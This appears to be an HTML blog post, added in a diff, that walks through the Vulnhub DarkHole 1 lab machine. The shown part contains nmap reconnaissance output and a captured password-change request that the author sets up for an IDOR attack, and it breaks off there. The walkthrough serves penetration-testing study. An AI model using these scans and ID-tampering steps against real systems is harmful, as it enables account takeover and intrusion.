@@ -1,0 +1,1032 @@
+<!doctype html><html lang=zh-cn dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="DarkHole 1 靶场 IDOR PATH劫持 初体验"><title>DarkHole1.0 Vulunhub靶场复现-重走来时路2</title><link rel=canonical href=https://ke1thli.github.io/p/darkhole1.0-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0-%E9%87%8D%E8%B5%B0%E6%9D%A5%E6%97%B6%E8%B7%AF2/><link rel=preconnect href=https://fonts.googleapis.com><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link rel=preload as=style href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap"><link rel=stylesheet href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap"><link rel=stylesheet href=/scss/style.min.389e156f5e9bb13df5a924cfa99dfb9c39f3e01e68d9e146cd65bdae963be145.css><meta property='og:title' content="DarkHole1.0 Vulunhub靶场复现-重走来时路2"><meta property='og:description' content="DarkHole 1 靶场 IDOR PATH劫持 初体验"><meta property='og:url' content='https://ke1thli.github.io/p/darkhole1.0-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0-%E9%87%8D%E8%B5%B0%E6%9D%A5%E6%97%B6%E8%B7%AF2/'><meta property='og:site_name' content='Ke1thLi 的技术笔记'><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='Vulnhub'><meta property='article:published_time' content='2026-07-18T00:00:00+00:00'><meta property='article:modified_time' content='2026-07-18T00:00:00+00:00'><meta name=twitter:title content="DarkHole1.0 Vulunhub靶场复现-重走来时路2"><meta name=twitter:description content="DarkHole 1 靶场 IDOR PATH劫持 初体验"><link rel="shortcut icon" href=/img/favicon.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label>
+<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar.png width=640 height=640 class=site-logo loading=lazy alt=Avatar>
+</a><span class=emoji>🎓</span></figure><div class=site-meta><h1 class=site-name><a href=/>Ke1thLi 的技术笔记</a></h1><h2 class=site-description>The harder you work, the luckier you get</h2></div></header><ol class=menu-social><li><a href=https://github.com/Ke1thLi title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
+<span>Home</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
+<span>Archives</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
+<span>Search</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
+<span>Links</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<span></span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title"></h2><div class=widget--toc><nav class=toc-nav id=TableOfContents><ol><li><a href=#主机发现>主机发现</a></li><li><a href=#端口扫描>端口扫描</a></li><li><a href=#idor-越权攻击>IDOR 越权攻击</a></li><li><a href=#文件上传尝试>文件上传尝试</a></li><li><a href=#反弹shell>反弹shell</a></li><li><a href=#尝试-sudo-提权失败>尝试 sudo 提权失败</a></li><li><a href=#继续进行信息收集>继续进行信息收集</a></li><li><a href=#path劫持>PATH劫持</a></li><li><a href=#读取用户flag以及获取john-ssh密码>读取用户flag以及获取john ssh密码</a></li><li><a href=#sudo脚本劫持提权到root>sudo脚本劫持提权到root</a></li><li><a href=#获取root-flag>获取root flag</a></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><div class=article-title-wrapper><h2 class=article-title><a href=/p/darkhole1.0-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0-%E9%87%8D%E8%B5%B0%E6%9D%A5%E6%97%B6%E8%B7%AF2/>DarkHole1.0 Vulunhub靶场复现-重走来时路2</a></h2><h3 class=article-subtitle>DarkHole 1 靶场 IDOR PATH劫持 初体验</h3></div><footer class=article-meta><div class=inline-meta><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
+<time class=article-time--published datetime=2026-07-18T00:00:00Z>Saturday, July 18, 2026</time>
+<svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<time class=article-time--reading></time></div></footer></div></header><aside class=article-toc><details><summary><div class=article-toc-title><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-chevron-right"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 6l6 6-6 6"/></svg>
+<span></span></div></summary><nav class=toc-nav><ol><li><a href=#主机发现>主机发现</a></li><li><a href=#端口扫描>端口扫描</a></li><li><a href=#idor-越权攻击>IDOR 越权攻击</a></li><li><a href=#文件上传尝试>文件上传尝试</a></li><li><a href=#反弹shell>反弹shell</a></li><li><a href=#尝试-sudo-提权失败>尝试 sudo 提权失败</a></li><li><a href=#继续进行信息收集>继续进行信息收集</a></li><li><a href=#path劫持>PATH劫持</a></li><li><a href=#读取用户flag以及获取john-ssh密码>读取用户flag以及获取john ssh密码</a></li><li><a href=#sudo脚本劫持提权到root>sudo脚本劫持提权到root</a></li><li><a href=#获取root-flag>获取root flag</a></li></ol></nav></details></aside><section class=article-content><h1 id=darkhole1-vulunhub靶场复现-重走来时路-2>DarkHole1 Vulunhub靶场复现-重走来时路 2</h1><h2 id=主机发现>主机发现</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Vulnhub/DarkHole1<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ sudo nmap -sn 10.10.10.0/24                
+</span></span><span class=line><span class=cl><span class=o>[</span>sudo<span class=o>]</span> kali 的密码：
+</span></span><span class=line><span class=cl>Starting Nmap 7.99 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2026-07-17 19:11 -0400
+</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.10.1
+</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.00056s latency<span class=o>)</span>.
+</span></span><span class=line><span class=cl>MAC Address: 00:50:56:C0:00:08 <span class=o>(</span>VMware<span class=o>)</span>
+</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.10.2
+</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.00017s latency<span class=o>)</span>.
+</span></span><span class=line><span class=cl>MAC Address: 00:50:56:F0:E1:42 <span class=o>(</span>VMware<span class=o>)</span>
+</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.10.130
+</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.00022s latency<span class=o>)</span>.
+</span></span><span class=line><span class=cl>MAC Address: 00:0C:29:70:A6:B2 <span class=o>(</span>VMware<span class=o>)</span>
+</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.10.254
+</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.00019s latency<span class=o>)</span>.
+</span></span><span class=line><span class=cl>MAC Address: 00:50:56:E9:73:E2 <span class=o>(</span>VMware<span class=o>)</span>
+</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.10.10
+</span></span><span class=line><span class=cl>Host is up.
+</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>256</span> IP addresses <span class=o>(</span><span class=m>5</span> hosts up<span class=o>)</span> scanned in 2.93 seconds
+</span></span></code></pre></td></tr></table></div></div><p>DarkHole 1 靶场ip 为10.10.10.130</p><h2 id=端口扫描>端口扫描</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span><span class=lnt>61
+</span><span class=lnt>62
+</span><span class=lnt>63
+</span><span class=lnt>64
+</span><span class=lnt>65
+</span><span class=lnt>66
+</span><span class=lnt>67
+</span><span class=lnt>68
+</span><span class=lnt>69
+</span><span class=lnt>70
+</span><span class=lnt>71
+</span><span class=lnt>72
+</span><span class=lnt>73
+</span><span class=lnt>74
+</span><span class=lnt>75
+</span><span class=lnt>76
+</span><span class=lnt>77
+</span><span class=lnt>78
+</span><span class=lnt>79
+</span><span class=lnt>80
+</span><span class=lnt>81
+</span><span class=lnt>82
+</span><span class=lnt>83
+</span><span class=lnt>84
+</span><span class=lnt>85
+</span><span class=lnt>86
+</span><span class=lnt>87
+</span><span class=lnt>88
+</span><span class=lnt>89
+</span><span class=lnt>90
+</span><span class=lnt>91
+</span><span class=lnt>92
+</span><span class=lnt>93
+</span><span class=lnt>94
+</span><span class=lnt>95
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Vulnhub/DarkHole1<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ sudo nmap --min-rate <span class=m>1000</span> -p- 10.10.10.130 -oA nmapscan/ports
+</span></span><span class=line><span class=cl>Starting Nmap 7.99 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2026-07-17 19:14 -0400
+</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.10.130
+</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.00082s latency<span class=o>)</span>.
+</span></span><span class=line><span class=cl>Not shown: <span class=m>65533</span> closed tcp ports <span class=o>(</span>reset<span class=o>)</span>
+</span></span><span class=line><span class=cl>PORT   STATE SERVICE
+</span></span><span class=line><span class=cl>22/tcp open  ssh
+</span></span><span class=line><span class=cl>80/tcp open  http
+</span></span><span class=line><span class=cl>MAC Address: 00:0C:29:70:A6:B2 <span class=o>(</span>VMware<span class=o>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 3.38 seconds
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Vulnhub/DarkHole1<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ sudo nmap -sT -sV -sC -O -p22,80 10.10.10.130 -Pn -oA nmapscan/detail
+</span></span><span class=line><span class=cl>Starting Nmap 7.99 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2026-07-17 19:16 -0400
+</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.10.130
+</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.00063s latency<span class=o>)</span>.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>PORT   STATE SERVICE VERSION
+</span></span><span class=line><span class=cl>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 <span class=o>(</span>Ubuntu Linux<span class=p>;</span> protocol 2.0<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span> ssh-hostkey: 
+</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>3072</span> e4:50:d9:50:5d:91:30:50:e9:b5:7d:ca:b0:51:db:74 <span class=o>(</span>RSA<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> 73:0c:76:86:60:63:06:00:21:c2:36:20:3b:99:c1:f7 <span class=o>(</span>ECDSA<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_  <span class=m>256</span> 54:53:4c:3f:4f:3a:26:f6:02:aa:9a:24:ea:1b:92:8c <span class=o>(</span>ED25519<span class=o>)</span>
+</span></span><span class=line><span class=cl>80/tcp open  http    Apache httpd 2.4.41 <span class=o>((</span>Ubuntu<span class=o>))</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Apache/2.4.41 <span class=o>(</span>Ubuntu<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span> http-cookie-flags: 
+</span></span><span class=line><span class=cl><span class=p>|</span>   /: 
+</span></span><span class=line><span class=cl><span class=p>|</span>     PHPSESSID: 
+</span></span><span class=line><span class=cl><span class=p>|</span>_      httponly flag not <span class=nb>set</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: DarkHole
+</span></span><span class=line><span class=cl>MAC Address: 00:0C:29:70:A6:B2 <span class=o>(</span>VMware<span class=o>)</span>
+</span></span><span class=line><span class=cl>Warning: OSScan results may be unreliable because we could not find at least <span class=m>1</span> open and <span class=m>1</span> closed port
+</span></span><span class=line><span class=cl>Device type: general purpose<span class=p>|</span>router
+</span></span><span class=line><span class=cl>Running: Linux 4.X<span class=p>|</span>5.X, MikroTik RouterOS 7.X
+</span></span><span class=line><span class=cl>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
+</span></span><span class=line><span class=cl>OS details: Linux 4.15 - 5.19, OpenWrt 21.02 <span class=o>(</span>Linux 5.4<span class=o>)</span>, MikroTik RouterOS 7.2 - 7.5 <span class=o>(</span>Linux 5.6.3<span class=o>)</span>
+</span></span><span class=line><span class=cl>Network Distance: <span class=m>1</span> hop
+</span></span><span class=line><span class=cl>Service Info: OS: Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 8.60 seconds
+</span></span><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Vulnhub/DarkHole1<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ sudo nmap -sU --top-ports <span class=m>100</span> 10.10.10.130 -oA nmapscan/udp
+</span></span><span class=line><span class=cl><span class=o>[</span>sudo<span class=o>]</span> kali 的密码：
+</span></span><span class=line><span class=cl>Starting Nmap 7.99 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2026-07-17 19:18 -0400
+</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.10.130
+</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.00058s latency<span class=o>)</span>.
+</span></span><span class=line><span class=cl>Not shown: <span class=m>99</span> closed udp ports <span class=o>(</span>port-unreach<span class=o>)</span>
+</span></span><span class=line><span class=cl>PORT   STATE         SERVICE
+</span></span><span class=line><span class=cl>68/udp open<span class=p>|</span>filtered dhcpc
+</span></span><span class=line><span class=cl>MAC Address: 00:0C:29:70:A6:B2 <span class=o>(</span>VMware<span class=o>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 109.11 seconds
+</span></span><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Vulnhub/DarkHole1<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ sudo nmap --script<span class=o>=</span>vuln -p22,80 10.10.10.130 -oA nmapscan/vuln
+</span></span><span class=line><span class=cl><span class=o>[</span>sudo<span class=o>]</span> kali 的密码：
+</span></span><span class=line><span class=cl>Starting Nmap 7.99 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2026-07-17 19:19 -0400
+</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.10.130
+</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.00056s latency<span class=o>)</span>.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>PORT   STATE SERVICE
+</span></span><span class=line><span class=cl>22/tcp open  ssh
+</span></span><span class=line><span class=cl>80/tcp open  http
+</span></span><span class=line><span class=cl><span class=p>|</span> http-csrf: 
+</span></span><span class=line><span class=cl><span class=p>|</span> Spidering limited to: <span class=nv>maxdepth</span><span class=o>=</span>3<span class=p>;</span> <span class=nv>maxpagecount</span><span class=o>=</span>20<span class=p>;</span> <span class=nv>withinhost</span><span class=o>=</span>10.10.10.130
+</span></span><span class=line><span class=cl><span class=p>|</span>   Found the following possible CSRF vulnerabilities: 
+</span></span><span class=line><span class=cl><span class=p>|</span>     
+</span></span><span class=line><span class=cl><span class=p>|</span>     Path: http://10.10.10.130:80/login.php
+</span></span><span class=line><span class=cl><span class=p>|</span>     Form id: login__username
+</span></span><span class=line><span class=cl><span class=p>|</span>     Form action: login.php
+</span></span><span class=line><span class=cl><span class=p>|</span>     
+</span></span><span class=line><span class=cl><span class=p>|</span>     Path: http://10.10.10.130:80/register.php
+</span></span><span class=line><span class=cl><span class=p>|</span>     Form id: login__username
+</span></span><span class=line><span class=cl><span class=p>|</span>_    Form action: 
+</span></span><span class=line><span class=cl><span class=p>|</span> http-cookie-flags: 
+</span></span><span class=line><span class=cl><span class=p>|</span>   /: 
+</span></span><span class=line><span class=cl><span class=p>|</span>     PHPSESSID: 
+</span></span><span class=line><span class=cl><span class=p>|</span>       httponly flag not <span class=nb>set</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>   /login.php: 
+</span></span><span class=line><span class=cl><span class=p>|</span>     PHPSESSID: 
+</span></span><span class=line><span class=cl><span class=p>|</span>_      httponly flag not <span class=nb>set</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-vuln-cve2017-1001000: ERROR: Script execution failed <span class=o>(</span>use -d to debug<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-stored-xss: Couldn<span class=s1>&#39;t find any stored XSS vulnerabilities.
+</span></span></span><span class=line><span class=cl><span class=s1>|_http-dombased-xss: Couldn&#39;</span>t find any DOM based XSS.
+</span></span><span class=line><span class=cl><span class=p>|</span> http-enum: 
+</span></span><span class=line><span class=cl><span class=p>|</span>   /login.php: Possible admin folder
+</span></span><span class=line><span class=cl><span class=p>|</span>   /config/: Potentially interesting directory w/ listing on <span class=s1>&#39;apache/2.4.41 (ubuntu)&#39;</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>   /css/: Potentially interesting directory w/ listing on <span class=s1>&#39;apache/2.4.41 (ubuntu)&#39;</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>   /js/: Potentially interesting directory w/ listing on <span class=s1>&#39;apache/2.4.41 (ubuntu)&#39;</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_  /upload/: Potentially interesting directory w/ listing on <span class=s1>&#39;apache/2.4.41 (ubuntu)&#39;</span>
+</span></span><span class=line><span class=cl>MAC Address: 00:0C:29:70:A6:B2 <span class=o>(</span>VMware<span class=o>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 31.41 seconds
+</span></span></code></pre></td></tr></table></div></div><div class=table-wrapper><table><thead><tr><th>端口</th><th>服务</th><th>版本信息</th><th>利用价值</th></tr></thead><tbody><tr><td>22/tcp</td><td>SSH</td><td>OpenSSH 8.2p1 Ubuntu</td><td>后续提权后可登录</td></tr><tr><td>80/tcp</td><td>HTTP</td><td>Apache 2.4.41 (Ubuntu)</td><td>Web 渗透核心入口</td></tr><tr><td>68/udp</td><td>dhcpc</td><td></td><td></td></tr></tbody></table></div><p>脚本爆出路径 有/upload/ /login.php/ /config/
+其中/css/ /js/ 未获取到有效信息</p><h2 id=idor-越权攻击>IDOR 越权攻击</h2><p>在登陆页面进行注册</p><p>账户: test
+邮箱: <a class=link href=mailto:test@gamil.com>test@gamil.com</a>
+密码: test</p><p>然后正常登陆</p><p>观察到url http://10.10.10.130/dashboard.php?id=2</p><p>可能存在sql注入，在工具sqlmap 尝试下无果，联想到IDOR 越权 于是对修改密码这部分进行抓包</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>POST /dashboard.php?id=2 HTTP/1.1
+</span></span><span class=line><span class=cl>Host: 10.10.10.130
+</span></span><span class=line><span class=cl>Content-Length: 15
+</span></span><span class=line><span class=cl>Cache-Control: max-age=0
+</span></span><span class=line><span class=cl>Upgrade-Insecure-Requests: 1
+</span></span><span class=line><span class=cl>Content-Type: application/x-www-form-urlencoded
+</span></span><span class=line><span class=cl>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
+</span></span><span class=line><span class=cl>Origin: http://10.10.10.130
+</span></span><span class=line><span class=cl>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+</span></span><span class=line><span class=cl>Referer: http://10.10.10.130/dashboard.php?id=2
+</span></span><span class=line><span class=cl>Accept-Encoding: gzip, deflate
+</span></span><span class=line><span class=cl>Accept-Language: zh-CN,zh;q=0.9
+</span></span><span class=line><span class=cl>Cookie: PHPSESSID=et31mqrilnn3ke3d94tjt720o0
+</span></span><span class=line><span class=cl>Connection: close
+</span></span><span class=line><span class=cl>password=1&amp;id=2
